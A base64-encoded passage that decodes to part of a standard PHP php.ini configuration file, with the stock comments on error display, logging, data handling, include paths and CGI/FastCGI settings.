BDIGZhdWx0Q29kZQo7eG1scnBjX2Vycm9yX251bWJlciA9IDAKCjsgV2hlbiBQSFAgZGlzcGxheXMgb3IgbG9ncyBhbiBlcnJvciwgaXQgaGFzIHRoZSBjYXBhYmlsaXR5IG9mIGZvcm1hdHRpbmcgdGhlCjsgZXJyb3IgbWVzc2FnZSBhcyBIVE1MIGZvciBlYXNpZXIgcmVhZGluZy4gVGhpcyBkaXJlY3RpdmUgY29udHJvbHMgd2hldGhlcgo7IHRoZSBlcnJvciBtZXNzYWdlIGlzIGZvcm1hdHRlZCBhcyBIVE1MIG9yIG5vdC4KOyBOb3RlOiBUaGlzIGRpcmVjdGl2ZSBpcyBoYXJkY29kZWQgdG8gT2ZmIGZvciB0aGUgQ0xJIFNBUEkKOyBEZWZhdWx0IFZhbHVlOiBPbgo7IERldmVsb3BtZW50IFZhbHVlOiBPbgo7IFByb2R1Y3Rpb24gdmFsdWU6IE9uCjsgaHR0cDovL3BocC5uZXQvaHRtbC1lcnJvcnMKaHRtbF9lcnJvcnMgPSBPbgoKOyBJZiBodG1sX2Vycm9ycyBpcyBzZXQgdG8gT24gKmFuZCogZG9jcmVmX3Jvb3QgaXMgbm90IGVtcHR5LCB0aGVuIFBIUAo7IHByb2R1Y2VzIGNsaWNrYWJsZSBlcnJvciBtZXNzYWdlcyB0aGF0IGRpcmVjdCB0byBhIHBhZ2UgZGVzY3JpYmluZyB0aGUgZXJyb3IKOyBvciBmdW5jdGlvbiBjYXVzaW5nIHRoZSBlcnJvciBpbiBkZXRhaWwuCjsgWW91IGNhbiBkb3dubG9hZCBhIGNvcHkgb2YgdGhlIFBIUCBtYW51YWwgZnJvbSBodHRwOi8vcGhwLm5ldC9kb2NzCjsgYW5kIGNoYW5nZSBkb2NyZWZfcm9vdCB0byB0aGUgYmFzZSBVUkwgb2YgeW91ciBsb2NhbCBjb3B5IGluY2x1ZGluZyB0aGUKOyBsZWFkaW5nICZhcG9zOy8mYXBvczsuIFlvdSBtdXN0IGFsc28gc3BlY2lmeSB0aGUgZmlsZSBleHRlbnNpb24gYmVpbmcgdXNlZCBpbmNsdWRpbmcKOyB0aGUgZG90LiBQSFAmYXBvcztzIGRlZmF1bHQgYmVoYXZpb3IgaXMgdG8gbGVhdmUgdGhlc2Ugc2V0dGluZ3MgZW1wdHksIGluIHdoaWNoCjsgY2FzZSBubyBsaW5rcyB0byBkb2N1bWVudGF0aW9uIGFyZSBnZW5lcmF0ZWQuCjsgTm90ZTogTmV2ZXIgdXNlIHRoaXMgZmVhdHVyZSBmb3IgcHJvZHVjdGlvbiBib3hlcy4KOyBodHRwOi8vcGhwLm5ldC9kb2NyZWYtcm9vdAo7IEV4YW1wbGVzCjtkb2NyZWZfcm9vdCA9ICZxdW90Oy9waHBtYW51YWwvJnF1b3Q7Cgo7IGh0dHA6Ly9waHAubmV0L2RvY3JlZi1leHQKO2RvY3JlZl9leHQgPSAuaHRtbAoKOyBTdHJpbmcgdG8gb3V0cHV0IGJlZm9yZSBhbiBlcnJvciBtZXNzYWdlLiBQSFAmYXBvcztzIGRlZmF1bHQgYmVoYXZpb3IgaXMgdG8gbGVhdmUKOyB0aGlzIHNldHRpbmcgYmxhbmsuCjsgaHR0cDovL3BocC5uZXQvZXJyb3ItcHJlcGVuZC1zdHJpbmcKOyBFeGFtcGxlOgo7ZXJyb3JfcHJlcGVuZF9zdHJpbmcgPSAmcXVvdDsmbHQ7c3BhbiBzdHlsZT0mYXBvcztjb2xvcjogI2ZmMDAwMCZhcG9zOyZndDsmcXVvdDsKCjsgU3RyaW5nIHRvIG91dHB1dCBhZnRlciBhbiBlcnJvciBtZXNzYWdlLiBQSFAmYXBvcztzIGRlZmF1bHQgYmVoYXZpb3IgaXMgdG8gbGVhdmUKOyB0aGlzIHNldHRpbmcgYmxhbmsuCjsgaHR0cDovL3BocC5uZXQvZXJyb3ItYXBwZW5kLXN0cmluZwo7IEV4YW1wbGU6CjtlcnJvcl9hcHBlbmRfc3RyaW5nID0gJnF1b3Q7Jmx0Oy9zcGFuJmd0OyZxdW90OwoKOyBMb2cgZXJyb3JzIHRvIHNwZWNpZmllZCBmaWxlLiBQSFAmYXBvcztzIGRlZmF1bHQgYmVoYXZpb3IgaXMgdG8gbGVhdmUgdGhpcyB2YWx1ZQo7IGVtcHR5Lgo7IGh0dHA6Ly9waHAubmV0L2Vycm9yLWxvZwo7IEV4YW1wbGU6CjtlcnJvcl9sb2cgPSBwaHBfZXJyb3JzLmxvZwo7IExvZyBlcnJvcnMgdG8gc3lzbG9nIChFdmVudCBMb2cgb24gV2luZG93cykuCjtlcnJvcl9sb2cgPSBzeXNsb2cKCjsgVGhlIHN5c2xvZyBpZGVudCBpcyBhIHN0cmluZyB3aGljaCBpcyBwcmVwZW5kZWQgdG8gZXZlcnkgbWVzc2FnZSBsb2dnZWQKOyB0byBzeXNsb2cuIE9ubHkgdXNlZCB3aGVuIGVycm9yX2xvZyBpcyBzZXQgdG8gc3lzbG9nLgo7c3lzbG9nLmlkZW50ID0gcGhwCgo7IFRoZSBzeXNsb2cgZmFjaWxpdHkgaXMgdXNlZCB0byBzcGVjaWZ5IHdoYXQgdHlwZSBvZiBwcm9ncmFtIGlzIGxvZ2dpbmcKOyB0aGUgbWVzc2FnZS4gT25seSB1c2VkIHdoZW4gZXJyb3JfbG9nIGlzIHNldCB0byBzeXNsb2cuCjtzeXNsb2cuZmFjaWxpdHkgPSB1c2VyCgo7IFNldCB0aGlzIHRvIGRpc2FibGUgZmlsdGVyaW5nIGNvbnRyb2wgY2hhcmFjdGVycyAodGhlIGRlZmF1bHQpLgo7IFNvbWUgbG9nZ2VycyBvbmx5IGFjY2VwdCBOVlQtQVNDSUksIG90aGVycyBhY2NlcHQgYW55dGhpbmcgdGhhdCZhcG9zO3Mgbm90CjsgY29udHJvbCBjaGFyYWN0ZXJzLiBJZiB5b3VyIGxvZ2dlciBhY2NlcHRzIGV2ZXJ5dGhpbmcsIHRoZW4gbm8gZmlsdGVyaW5nCjsgaXMgbmVlZGVkIGF0IGFsbC4KOyBBbGxvd2VkIHZhbHVlcyBhcmU6CjsgICBhc2NpaSAoYWxsIHByaW50YWJsZSBBU0NJSSBjaGFyYWN0ZXJzIGFuZCBOTCkKOyAgIG5vLWN0cmwgKGFsbCBjaGFyYWN0ZXJzIGV4Y2VwdCBjb250cm9sIGNoYXJhY3RlcnMpCjsgICBhbGwgKGFsbCBjaGFyYWN0ZXJzKQo7ICAgcmF3IChsaWtlICZxdW90O2FsbCZxdW90OywgYnV0IG1lc3NhZ2VzIGFyZSBub3Qgc3BsaXQgYXQgbmV3bGluZXMpCjsgaHR0cDovL3BocC5uZXQvc3lzbG9nLmZpbHRlcgo7c3lzbG9nLmZpbHRlciA9IGFzY2lpCgo7d2luZG93cy5zaG93X2NydF93YXJuaW5nCjsgRGVmYXVsdCB2YWx1ZTogMAo7IERldmVsb3BtZW50IHZhbHVlOiAwCjsgUHJvZHVjdGlvbiB2YWx1ZTogMAoKOzs7Ozs7Ozs7Ozs7Ozs7OzsKOyBEYXRhIEhhbmRsaW5nIDsKOzs7Ozs7Ozs7Ozs7Ozs7OzsKCjsgVGhlIHNlcGFyYXRvciB1c2VkIGluIFBIUCBnZW5lcmF0ZWQgVVJMcyB0byBzZXBhcmF0ZSBhcmd1bWVudHMuCjsgUEhQJmFwb3M7cyBkZWZhdWx0IHNldHRpbmcgaXMgJnF1b3Q7JmFtcDsmcXVvdDsuCjsgaHR0cDovL3BocC5uZXQvYXJnLXNlcGFyYXRvci5vdXRwdXQKOyBFeGFtcGxlOgo7YXJnX3NlcGFyYXRvci5vdXRwdXQgPSAmcXVvdDsmYW1wO2FtcDsmcXVvdDsKCjsgTGlzdCBvZiBzZXBhcmF0b3IocykgdXNlZCBieSBQSFAgdG8gcGFyc2UgaW5wdXQgVVJMcyBpbnRvIHZhcmlhYmxlcy4KOyBQSFAmYXBvcztzIGRlZmF1bHQgc2V0dGluZyBpcyAmcXVvdDsmYW1wOyZxdW90Oy4KOyBOT1RFOiBFdmVyeSBjaGFyYWN0ZXIgaW4gdGhpcyBkaXJlY3RpdmUgaXMgY29uc2lkZXJlZCBhcyBzZXBhcmF0b3IhCjsgaHR0cDovL3BocC5uZXQvYXJnLXNlcGFyYXRvci5pbnB1dAo7IEV4YW1wbGU6Cjthcmdfc2VwYXJhdG9yLmlucHV0ID0gJnF1b3Q7OyZhbXA7JnF1b3Q7Cgo7IFRoaXMgZGlyZWN0aXZlIGRldGVybWluZXMgd2hpY2ggc3VwZXIgZ2xvYmFsIGFycmF5cyBhcmUgcmVnaXN0ZXJlZCB3aGVuIFBIUAo7IHN0YXJ0cyB1cC4gRyxQLEMsRSAmYW1wOyBTIGFyZSBhYmJyZXZpYXRpb25zIGZvciB0aGUgZm9sbG93aW5nIHJlc3BlY3RpdmUgc3VwZXIKOyBnbG9iYWxzOiBHRVQsIFBPU1QsIENPT0tJRSwgRU5WIGFuZCBTRVJWRVIuIFRoZXJlIGlzIGEgcGVyZm9ybWFuY2UgcGVuYWx0eQo7IHBhaWQgZm9yIHRoZSByZWdpc3RyYXRpb24gb2YgdGhlc2UgYXJyYXlzIGFuZCBiZWNhdXNlIEVOViBpcyBub3QgYXMgY29tbW9ubHkKOyB1c2VkIGFzIHRoZSBvdGhlcnMsIEVOViBpcyBub3QgcmVjb21tZW5kZWQgb24gcHJvZHVjdGlvbnMgc2VydmVycy4gWW91CjsgY2FuIHN0aWxsIGdldCBhY2Nlc3MgdG8gdGhlIGVudmlyb25tZW50IHZhcmlhYmxlcyB0aHJvdWdoIGdldGVudigpIHNob3VsZCB5b3UKOyBuZWVkIHRvLgo7IERlZmF1bHQgVmFsdWU6ICZxdW90O0VHUENTJnF1b3Q7CjsgRGV2ZWxvcG1lbnQgVmFsdWU6ICZxdW90O0dQQ1MmcXVvdDsKOyBQcm9kdWN0aW9uIFZhbHVlOiAmcXVvdDtHUENTJnF1b3Q7Owo7IGh0dHA6Ly9waHAubmV0L3ZhcmlhYmxlcy1vcmRlcgp2YXJpYWJsZXNfb3JkZXIgPSAmcXVvdDtHUENTJnF1b3Q7Cgo7IFRoaXMgZGlyZWN0aXZlIGRldGVybWluZXMgd2hpY2ggc3VwZXIgZ2xvYmFsIGRhdGEgKEcsUCAmYW1wOyBDKSBzaG91bGQgYmUKOyByZWdpc3RlcmVkIGludG8gdGhlIHN1cGVyIGdsb2JhbCBhcnJheSBSRVFVRVNULiBJZiBzbywgaXQgYWxzbyBkZXRlcm1pbmVzCjsgdGhlIG9yZGVyIGluIHdoaWNoIHRoYXQgZGF0YSBpcyByZWdpc3RlcmVkLiBUaGUgdmFsdWVzIGZvciB0aGlzIGRpcmVjdGl2ZQo7IGFyZSBzcGVjaWZpZWQgaW4gdGhlIHNhbWUgbWFubmVyIGFzIHRoZSB2YXJpYWJsZXNfb3JkZXIgZGlyZWN0aXZlLAo7IEVYQ0VQVCBvbmUuIExlYXZpbmcgdGhpcyB2YWx1ZSBlbXB0eSB3aWxsIGNhdXNlIFBIUCB0byB1c2UgdGhlIHZhbHVlIHNldAo7IGluIHRoZSB2YXJpYWJsZXNfb3JkZXIgZGlyZWN0aXZlLiBJdCBkb2VzIG5vdCBtZWFuIGl0IHdpbGwgbGVhdmUgdGhlIHN1cGVyCjsgZ2xvYmFscyBhcnJheSBSRVFVRVNUIGVtcHR5Lgo7IERlZmF1bHQgVmFsdWU6IE5vbmUKOyBEZXZlbG9wbWVudCBWYWx1ZTogJnF1b3Q7R1AmcXVvdDsKOyBQcm9kdWN0aW9uIFZhbHVlOiAmcXVvdDtHUCZxdW90Owo7IGh0dHA6Ly9waHAubmV0L3JlcXVlc3Qtb3JkZXIKcmVxdWVzdF9vcmRlciA9ICZxdW90O0dQJnF1b3Q7Cgo7IFRoaXMgZGlyZWN0aXZlIGRldGVybWluZXMgd2hldGhlciBQSFAgcmVnaXN0ZXJzICRhcmd2ICZhbXA7ICRhcmdjIGVhY2ggdGltZSBpdAo7IHJ1bnMuICRhcmd2IGNvbnRhaW5zIGFuIGFycmF5IG9mIGFsbCB0aGUgYXJndW1lbnRzIHBhc3NlZCB0byBQSFAgd2hlbiBhIHNjcmlwdAo7IGlzIGludm9rZWQuICRhcmdjIGNvbnRhaW5zIGFuIGludGVnZXIgcmVwcmVzZW50aW5nIHRoZSBudW1iZXIgb2YgYXJndW1lbnRzCjsgdGhhdCB3ZXJlIHBhc3NlZCB3aGVuIHRoZSBzY3JpcHQgd2FzIGludm9rZWQuIFRoZXNlIGFycmF5cyBhcmUgZXh0cmVtZWx5CjsgdXNlZnVsIHdoZW4gcnVubmluZyBzY3JpcHRzIGZyb20gdGhlIGNvbW1hbmQgbGluZS4gV2hlbiB0aGlzIGRpcmVjdGl2ZSBpcwo7IGVuYWJsZWQsIHJlZ2lzdGVyaW5nIHRoZXNlIHZhcmlhYmxlcyBjb25zdW1lcyBDUFUgY3ljbGVzIGFuZCBtZW1vcnkgZWFjaCB0aW1lCjsgYSBzY3JpcHQgaXMgZXhlY3V0ZWQuIEZvciBwZXJmb3JtYW5jZSByZWFzb25zLCB0aGlzIGZlYXR1cmUgc2hvdWxkIGJlIGRpc2FibGVkCjsgb24gcHJvZHVjdGlvbiBzZXJ2ZXJzLgo7IE5vdGU6IFRoaXMgZGlyZWN0aXZlIGlzIGhhcmRjb2RlZCB0byBPbiBmb3IgdGhlIENMSSBTQVBJCjsgRGVmYXVsdCBWYWx1ZTogT24KOyBEZXZlbG9wbWVudCBWYWx1ZTogT2ZmCjsgUHJvZHVjdGlvbiBWYWx1ZTogT2ZmCjsgaHR0cDovL3BocC5uZXQvcmVnaXN0ZXItYXJnYy1hcmd2CnJlZ2lzdGVyX2FyZ2NfYXJndiA9IE9mZgoKOyBXaGVuIGVuYWJsZWQsIHRoZSBFTlYsIFJFUVVFU1QgYW5kIFNFUlZFUiB2YXJpYWJsZXMgYXJlIGNyZWF0ZWQgd2hlbiB0aGV5JmFwb3M7cmUKOyBmaXJzdCB1c2VkIChKdXN0IEluIFRpbWUpIGluc3RlYWQgb2Ygd2hlbiB0aGUgc2NyaXB0IHN0YXJ0cy4gSWYgdGhlc2UKOyB2YXJpYWJsZXMgYXJlIG5vdCB1c2VkIHdpdGhpbiBhIHNjcmlwdCwgaGF2aW5nIHRoaXMgZGlyZWN0aXZlIG9uIHdpbGwgcmVzdWx0CjsgaW4gYSBwZXJmb3JtYW5jZSBnYWluLiBUaGUgUEhQIGRpcmVjdGl2ZSByZWdpc3Rlcl9hcmdjX2FyZ3YgbXVzdCBiZSBkaXNhYmxlZAo7IGZvciB0aGlzIGRpcmVjdGl2ZSB0byBoYXZlIGFueSBhZmZlY3QuCjsgaHR0cDovL3BocC5uZXQvYXV0by1nbG9iYWxzLWppdAphdXRvX2dsb2JhbHNfaml0ID0gT24KCjsgV2hldGhlciBQSFAgd2lsbCByZWFkIHRoZSBQT1NUIGRhdGEuCjsgVGhpcyBvcHRpb24gaXMgZW5hYmxlZCBieSBkZWZhdWx0Lgo7IE1vc3QgbGlrZWx5LCB5b3Ugd29uJmFwb3M7dCB3YW50IHRvIGRpc2FibGUgdGhpcyBvcHRpb24gZ2xvYmFsbHkuIEl0IGNhdXNlcyAkX1BPU1QKOyBhbmQgJF9GSUxFUyB0byBhbHdheXMgYmUgZW1wdHk7IHRoZSBvbmx5IHdheSB5b3Ugd2lsbCBiZSBhYmxlIHRvIHJlYWQgdGhlCjsgUE9TVCBkYXRhIHdpbGwgYmUgdGhyb3VnaCB0aGUgcGhwOi8vaW5wdXQgc3RyZWFtIHdyYXBwZXIuIFRoaXMgY2FuIGJlIHVzZWZ1bAo7IHRvIHByb3h5IHJlcXVlc3RzIG9yIHRvIHByb2Nlc3MgdGhlIFBPU1QgZGF0YSBpbiBhIG1lbW9yeSBlZmZpY2llbnQgZmFzaGlvbi4KOyBodHRwOi8vcGhwLm5ldC9lbmFibGUtcG9zdC1kYXRhLXJlYWRpbmcKO2VuYWJsZV9wb3N0X2RhdGFfcmVhZGluZyA9IE9mZgoKOyBNYXhpbXVtIHNpemUgb2YgUE9TVCBkYXRhIHRoYXQgUEhQIHdpbGwgYWNjZXB0Lgo7IEl0cyB2YWx1ZSBtYXkgYmUgMCB0byBkaXNhYmxlIHRoZSBsaW1pdC4gSXQgaXMgaWdub3JlZCBpZiBQT1NUIGRhdGEgcmVhZGluZwo7IGlzIGRpc2FibGVkIHRocm91Z2ggZW5hYmxlX3Bvc3RfZGF0YV9yZWFkaW5nLgo7IGh0dHA6Ly9waHAubmV0L3Bvc3QtbWF4LXNpemUKcG9zdF9tYXhfc2l6ZSA9IDhNCgo7IEF1dG9tYXRpY2FsbHkgYWRkIGZpbGVzIGJlZm9yZSBQSFAgZG9jdW1lbnQuCjsgaHR0cDovL3BocC5uZXQvYXV0by1wcmVwZW5kLWZpbGUKYXV0b19wcmVwZW5kX2ZpbGUgPQoKOyBBdXRvbWF0aWNhbGx5IGFkZCBmaWxlcyBhZnRlciBQSFAgZG9jdW1lbnQuCjsgaHR0cDovL3BocC5uZXQvYXV0by1hcHBlbmQtZmlsZQphdXRvX2FwcGVuZF9maWxlID0KCjsgQnkgZGVmYXVsdCwgUEhQIHdpbGwgb3V0cHV0IGEgbWVkaWEgdHlwZSB1c2luZyB0aGUgQ29udGVudC1UeXBlIGhlYWRlci4gVG8KOyBkaXNhYmxlIHRoaXMsIHNpbXBseSBzZXQgaXQgdG8gYmUgZW1wdHkuCjsKOyBQSFAmYXBvcztzIGJ1aWx0LWluIGRlZmF1bHQgbWVkaWEgdHlwZSBpcyBzZXQgdG8gdGV4dC9odG1sLgo7IGh0dHA6Ly9waHAubmV0L2RlZmF1bHQtbWltZXR5cGUKZGVmYXVsdF9taW1ldHlwZSA9ICZxdW90O3RleHQvaHRtbCZxdW90OwoKOyBQSFAmYXBvcztzIGRlZmF1bHQgY2hhcmFjdGVyIHNldCBpcyBzZXQgdG8gVVRGLTguCjsgaHR0cDovL3BocC5uZXQvZGVmYXVsdC1jaGFyc2V0CmRlZmF1bHRfY2hhcnNldCA9ICZxdW90O1VURi04JnF1b3Q7Cgo7IFBIUCBpbnRlcm5hbCBjaGFyYWN0ZXIgZW5jb2RpbmcgaXMgc2V0IHRvIGVtcHR5Lgo7IElmIGVtcHR5LCBkZWZhdWx0X2NoYXJzZXQgaXMgdXNlZC4KOyBodHRwOi8vcGhwLm5ldC9pbnRlcm5hbC1lbmNvZGluZwo7aW50ZXJuYWxfZW5jb2RpbmcgPQoKOyBQSFAgaW5wdXQgY2hhcmFjdGVyIGVuY29kaW5nIGlzIHNldCB0byBlbXB0eS4KOyBJZiBlbXB0eSwgZGVmYXVsdF9jaGFyc2V0IGlzIHVzZWQuCjsgaHR0cDovL3BocC5uZXQvaW5wdXQtZW5jb2RpbmcKO2lucHV0X2VuY29kaW5nID0KCjsgUEhQIG91dHB1dCBjaGFyYWN0ZXIgZW5jb2RpbmcgaXMgc2V0IHRvIGVtcHR5Lgo7IElmIGVtcHR5LCBkZWZhdWx0X2NoYXJzZXQgaXMgdXNlZC4KOyBTZWUgYWxzbyBvdXRwdXRfYnVmZmVyLgo7IGh0dHA6Ly9waHAubmV0L291dHB1dC1lbmNvZGluZwo7b3V0cHV0X2VuY29kaW5nID0KCjs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7OzsKOyBQYXRocyBhbmQgRGlyZWN0b3JpZXMgOwo7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Cgo7IFVOSVg6ICZxdW90Oy9wYXRoMTovcGF0aDImcXVvdDsKO2luY2x1ZGVfcGF0aCA9ICZxdW90Oy46L3BocC9pbmNsdWRlcyZxdW90Owo7CjsgV2luZG93czogJnF1b3Q7XHBhdGgxO1xwYXRoMiZxdW90Owo7aW5jbHVkZV9wYXRoID0gJnF1b3Q7LjtjOlxwaHBcaW5jbHVkZXMmcXVvdDsKOwo7IFBIUCZhcG9zO3MgZGVmYXVsdCBzZXR0aW5nIGZvciBpbmNsdWRlX3BhdGggaXMgJnF1b3Q7LjsvcGF0aC90by9waHAvcGVhciZxdW90Owo7IGh0dHA6Ly9waHAubmV0L2luY2x1ZGUtcGF0aAoKOyBUaGUgcm9vdCBvZiB0aGUgUEhQIHBhZ2VzLCB1c2VkIG9ubHkgaWYgbm9uZW1wdHkuCjsgaWYgUEhQIHdhcyBub3QgY29tcGlsZWQgd2l0aCBGT1JDRV9SRURJUkVDVCwgeW91IFNIT1VMRCBzZXQgZG9jX3Jvb3QKOyBpZiB5b3UgYXJlIHJ1bm5pbmcgcGhwIGFzIGEgQ0dJIHVuZGVyIGFueSB3ZWIgc2VydmVyIChvdGhlciB0aGFuIElJUykKOyBzZWUgZG9jdW1lbnRhdGlvbiBmb3Igc2VjdXJpdHkgaXNzdWVzLiAgVGhlIGFsdGVybmF0ZSBpcyB0byB1c2UgdGhlCjsgY2dpLmZvcmNlX3JlZGlyZWN0IGNvbmZpZ3VyYXRpb24gYmVsb3cKOyBodHRwOi8vcGhwLm5ldC9kb2Mtcm9vdApkb2Nfcm9vdCA9Cgo7IFRoZSBkaXJlY3RvcnkgdW5kZXIgd2hpY2ggUEhQIG9wZW5zIHRoZSBzY3JpcHQgdXNpbmcgL351c2VybmFtZSB1c2VkIG9ubHkKOyBpZiBub25lbXB0eS4KOyBodHRwOi8vcGhwLm5ldC91c2VyLWRpcgp1c2VyX2RpciA9Cgo7IERpcmVjdG9yeSBpbiB3aGljaCB0aGUgbG9hZGFibGUgZXh0ZW5zaW9ucyAobW9kdWxlcykgcmVzaWRlLgo7IGh0dHA6Ly9waHAubmV0L2V4dGVuc2lvbi1kaXIKO2V4dGVuc2lvbl9kaXIgPSAmcXVvdDsuLyZxdW90Owo7IE9uIHdpbmRvd3M6CjtleHRlbnNpb25fZGlyID0gJnF1b3Q7ZXh0JnF1b3Q7Cgo7IERpcmVjdG9yeSB3aGVyZSB0aGUgdGVtcG9yYXJ5IGZpbGVzIHNob3VsZCBiZSBwbGFjZWQuCjsgRGVmYXVsdHMgdG8gdGhlIHN5c3RlbSBkZWZhdWx0IChzZWUgc3lzX2dldF90ZW1wX2RpcikKO3N5c190ZW1wX2RpciA9ICZxdW90Oy90bXAmcXVvdDsKCjsgV2hldGhlciBvciBub3QgdG8gZW5hYmxlIHRoZSBkbCgpIGZ1bmN0aW9uLiAgVGhlIGRsKCkgZnVuY3Rpb24gZG9lcyBOT1Qgd29yawo7IHByb3Blcmx5IGluIG11bHRpdGhyZWFkZWQgc2VydmVycywgc3VjaCBhcyBJSVMgb3IgWmV1cywgYW5kIGlzIGF1dG9tYXRpY2FsbHkKOyBkaXNhYmxlZCBvbiB0aGVtLgo7IGh0dHA6Ly9waHAubmV0L2VuYWJsZS1kbAplbmFibGVfZGwgPSBPZmYKCjsgY2dpLmZvcmNlX3JlZGlyZWN0IGlzIG5lY2Vzc2FyeSB0byBwcm92aWRlIHNlY3VyaXR5IHJ1bm5pbmcgUEhQIGFzIGEgQ0dJIHVuZGVyCjsgbW9zdCB3ZWIgc2VydmVycy4gIExlZnQgdW5kZWZpbmVkLCBQSFAgdHVybnMgdGhpcyBvbiBieSBkZWZhdWx0LiAgWW91IGNhbgo7IHR1cm4gaXQgb2ZmIGhlcmUgQVQgWU9VUiBPV04gUklTSwo7ICoqWW91IENBTiBzYWZlbHkgdHVybiB0aGlzIG9mZiBmb3IgSUlTLCBpbiBmYWN0LCB5b3UgTVVTVC4qKgo7IGh0dHA6Ly9waHAubmV0L2NnaS5mb3JjZS1yZWRpcmVjdAo7Y2dpLmZvcmNlX3JlZGlyZWN0ID0gMQoKOyBpZiBjZ2kubnBoIGlzIGVuYWJsZWQgaXQgd2lsbCBmb3JjZSBjZ2kgdG8gYWx3YXlzIHNlbnQgU3RhdHVzOiAyMDAgd2l0aAo7IGV2ZXJ5IHJlcXVlc3QuIFBIUCZhcG9zO3MgZGVmYXVsdCBiZWhhdmlvciBpcyB0byBkaXNhYmxlIHRoaXMgZmVhdHVyZS4KO2NnaS5ucGggPSAxCgo7IGlmIGNnaS5mb3JjZV9yZWRpcmVjdCBpcyB0dXJuZWQgb24sIGFuZCB5b3UgYXJlIG5vdCBydW5uaW5nIHVuZGVyIEFwYWNoZSBvciBOZXRzY2FwZQo7IChpUGxhbmV0KSB3ZWIgc2VydmVycywgeW91IE1BWSBuZWVkIHRvIHNldCBhbiBlbnZpcm9ubWVudCB2YXJpYWJsZSBuYW1lIHRoYXQgUEhQCjsgd2lsbCBsb29rIGZvciB0byBrbm93IGl0IGlzIE9LIHRvIGNvbnRpbnVlIGV4ZWN1dGlvbi4gIFNldHRpbmcgdGhpcyB2YXJpYWJsZSBNQVkKOyBjYXVzZSBzZWN1cml0eSBpc3N1ZXMsIEtOT1cgV0hBVCBZT1UgQVJFIERPSU5HIEZJUlNULgo7IGh0dHA6Ly9waHAubmV0L2NnaS5yZWRpcmVjdC1zdGF0dXMtZW52CjtjZ2kucmVkaXJlY3Rfc3RhdHVzX2VudiA9Cgo7IGNnaS5maXhfcGF0aGluZm8gcHJvdmlkZXMgKnJlYWwqIFBBVEhfSU5GTy9QQVRIX1RSQU5TTEFURUQgc3VwcG9ydCBmb3IgQ0dJLiAgUEhQJmFwb3M7cwo7IHByZXZpb3VzIGJlaGF2aW91ciB3YXMgdG8gc2V0IFBBVEhfVFJBTlNMQVRFRCB0byBTQ1JJUFRfRklMRU5BTUUsIGFuZCB0byBub3QgZ3Jvawo7IHdoYXQgUEFUSF9JTkZPIGlzLiAgRm9yIG1vcmUgaW5mb3JtYXRpb24gb24gUEFUSF9JTkZPLCBzZWUgdGhlIGNnaSBzcGVjcy4gIFNldHRpbmcKOyB0aGlzIHRvIDEgd2lsbCBjYXVzZSBQSFAgQ0dJIHRvIGZpeCBpdHMgcGF0aHMgdG8gY29uZm9ybSB0byB0aGUgc3BlYy4gIEEgc2V0dGluZwo7IG9mIHplcm8gY2F1c2VzIFBIUCB0byBiZWhhdmUgYXMgYmVmb3JlLiAgRGVmYXVsdCBpcyAxLiAgWW91IHNob3VsZCBmaXggeW91ciBzY3JpcHRzCjsgdG8gdXNlIFNDUklQVF9GSUxFTkFNRSByYXRoZXIgdGhhbiBQQVRIX1RSQU5TTEFURUQuCjsgaHR0cDovL3BocC5uZXQvY2dpLmZpeC1wYXRoaW5mbwo7Y2dpLmZpeF9wYXRoaW5mbz0xCgo7IGlmIGNnaS5kaXNjYXJkX3BhdGggaXMgZW5hYmxlZCwgdGhlIFBIUCBDR0kgYmluYXJ5IGNhbiBzYWZlbHkgYmUgcGxhY2VkIG91dHNpZGUKOyBvZiB0aGUgd2ViIHRyZWUgYW5kIHBlb3BsZSB3aWxsIG5vdCBiZSBhYmxlIHRvIGNpcmN1bXZlbnQgLmh0YWNjZXNzIHNlY3VyaXR5Lgo7Y2dpLmRpc2NhcmRfcGF0aD0xCgo7IEZhc3RDR0kgdW5kZXIgSUlTIHN1cHBvcnRzIHRoZSBhYmlsaXR5IHRvIGltcGVyc29uYXRlCjsgc2VjdXJpdHkgdG9rZW5zIG9mIHRoZSBjYWxsaW5nIGNsaWVudC4gIFRoaXMgYWxsb3dzIElJUyB0byBkZWZpbmUgdGhlCjsgc2VjdXJpdHkgY29udGV4dCB0aGF0IHRoZSByZXF1ZXN0IHJ1bnMgdW5kZXIuICBtb2RfZmFzdGNnaSB1bmRlciBBcGFjaGUKOyBkb2VzIG5vdCBjdXJyZW50bHkgc3VwcG9ydCB0aGlzIGZlYXR1cmUgKDAzLzE3LzIwMDIpCjsgU2V0IHRvIDEgaWYgcnVubmluZyB1bmRlciBJSVMuICBEZWZhdWx0IGlzIHplcm8uCjsgaHR0cDovL3BocC5uZXQvZmFzdGNnaS5pbXBlcnNvbmF0ZQo7ZmFzdGNnaS5pbXBlcnNvbmF0ZSA9IDEKCjsgRGlzYWJsZSBsb2dnaW5nIHRocm91Z2ggRmFzdENHSSBjb25uZWN0aW9uLiBQSFAmYXBvcztzIGRlZmF1bHQgYmVoYXZpb3IgaXMgdG8gZW5hYmxlCjsgdGhpcyBmZWF0dXJlLgo7ZmFzdGNnaS5sb2dnaW5nID0gMAoKOyBjZ2kucmZjMjYxNl9oZWFkZXJzIGNvbmZpZ3VyYXRpb24gb3B0aW9uIHRlbGxzIFBIUCB3aGF0IHR5cGUgb2YgaGVhZGVycyB0bwo7IHVzZSB3aGVuIHNlbmRpbmcgSFRUUCByZXNwb25zZSBjb2RlLiBJZiBzZXQgdG8gMCwgUEhQIHNlbmRzIFN0YXR1czogaGVhZGVyIHRoYXQKOyBpcyBzdXBwb3J0ZWQgYnkgQXBhY2hlLiBXaGVuIHRoaXMgb3B0aW9uIGlzIHNldCB0byAxLCBQSFAgd2lsbCBzZW5kCjsgUkZDMjYxNiBjb21wbGlhbnQgaGVhZGVyLgo7IERlZmF1bHQgaXMgemVyby4KOyBodHRwOi8vcGhwLm5ldC9jZ2kucmZjMjYxNi1oZWFkZXJzCjtjZ2kucmZjMjYxNl9oZWFkZXJzID0gMAoKOyBjZ2kuY2hlY2tfc2hlYmFuZ19saW5lIGNvbnRyb2xzIHdoZXRoZXIgQ0dJIFBIUCBjaGVja3MgZm9yIGxpbmUgc3RhcnRpbmcgd2l0aCAjIQo7IChzaGViYW5nKSBhdCB0aGUgdG9wIG9mIHRoZSBydW5uaW5nIHNjcmlwdC4gVGhpcyBsaW5lIG1pZ2h0IGJlIG5lZWRlZCBpZiB0aGUKOyBzY3JpcHQgc3VwcG9ydCBydW5uaW5nIGJvdGggYXMgc3RhbmQtYWxvbmUgc2NyaXB0IGFuZCB2aWEgUEhQIENHSSZsdDsuIFBIUCBpbiBDR0kKOyBtb2